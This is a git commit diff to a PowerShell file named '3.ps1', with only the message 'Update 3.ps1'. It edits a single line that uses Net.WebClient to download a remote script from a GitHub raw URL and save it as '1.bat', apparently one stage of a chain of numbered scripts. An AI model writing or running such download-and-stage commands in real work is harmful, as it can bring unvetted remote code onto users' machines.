98354cd69bcba1e426a3a44e08bdf488a286b8bc
XRedMelonX <89304906+XRedMelonX@users.noreply.github.com>
2024-06-05 18:17:07 +0100

    Update 3.ps1

--- 3.ps1
+++ 3.ps1
@@ -1,1 +1,1 @@
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/XRedMelonX/123/main/2.ps1', '1.bat')"
+-Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/XRedMelonX/123/main/2.ps1', '1.bat')"
